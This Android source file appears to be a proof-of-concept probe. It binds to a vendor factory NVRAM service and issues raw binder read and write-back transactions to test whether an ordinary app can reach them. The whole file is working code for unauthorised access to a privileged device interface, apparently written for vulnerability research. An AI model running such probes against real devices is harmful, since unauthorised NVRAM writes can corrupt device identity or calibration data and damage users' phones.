package com.probe.nvaidl;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

public class MainActivity extends Activity {
    static final String TAG = "nvprobe";
    static final String PKG = "com.huaqin.NvService";
    static final String CLS = "com.huaqin.NvService.FactoryNvramService";
    static final String DESC = "aidl.NvAidlService";

    static IBinder svc;

    static void log(String s) {
        Log.i(TAG, s);
        System.out.println("[NVP] " + s);
    }

    static String read(int code, int a1, int a2) {
        try {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken(DESC);
            data.writeInt(a1);
            data.writeInt(a2);
            boolean ok = b_transact(data, reply, code);
            int ex = reply.readInt();
            String r = (ex == 0) ? reply.readString() : null;
            data.recycle();
            reply.recycle();
            log("R code=" + code + " (" + a1 + "," + a2 + ") ok=" + ok + " ex=" + ex
                    + " len=" + (r == null ? -1 : r.length()));
            return r;
        } catch (Throwable t) {
            log("R EX: " + t);
            return null;
        }
    }

    static boolean b_transact(Parcel data, Parcel reply, int code) {
        try {
            return svc.transact(code, data, reply, 0);
        } catch (Throwable t) {
            return false;
        }
    }

    static boolean write(int code, int a1, int a2) {
        try {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken(DESC);
            data.writeInt(a1);
            data.writeInt(a2);
            boolean ok = svc.transact(code, data, reply, 0);
            int ex = reply.readInt();
            int r = (ex == 0) ? reply.readInt() : -999;
            data.recycle();
            reply.recycle();
            log("W code=" + code + " (" + a1 + "," + a2 + ") ok=" + ok + " ex=" + ex + " ret=" + r);
            return true;
        } catch (Throwable t) {
            log("W EX: " + t);
            return false;
        }
    }

    @Override
    protected void onCreate(Bundle bnd) {
        super.onCreate(bnd);
        log("onCreate uid=" + android.os.Process.myUid());
        try {
            Intent it = new Intent();
            it.setComponent(new ComponentName(PKG, CLS));
            it.setAction("com.huaqin.action.factoryNv");
            ServiceConnection conn = new ServiceConnection() {
                public void onServiceConnected(ComponentName n, IBinder bb) {
                    svc = bb;
                    new Thread() {
                        public void run() {
                            try {
                                log("desc=" + svc.getInterfaceDescriptor());
                                log("STEP1 read-before");
                                String before = read(2, 0, 256);
                                String beforeB = before == null ? null : before.substring(0, 64);
                                log("before64=" + beforeB);

                                log("STEP2 idempotent write-back (identical full range)");
                                write(3, 0, 256);

                                log("STEP3 read-after");
                                String after = read(2, 0, 256);
                                String afterB = after == null ? null : after.substring(0, 64);
                                log("after64=" + afterB);

                                boolean same = before != null && before.equals(after);
                                log("RESULT identical=" + same);
                            } catch (Throwable t) {
                                log("EX: " + t);
                            }
                        }
                    }.start();
                }
                public void onServiceDisconnected(ComponentName n) { log("disc"); }
            };
            log("bind=" + bindService(it, conn, Context.BIND_AUTO_CREATE));
        } catch (Throwable t) {
            log("EX: " + t);
        }
    }
}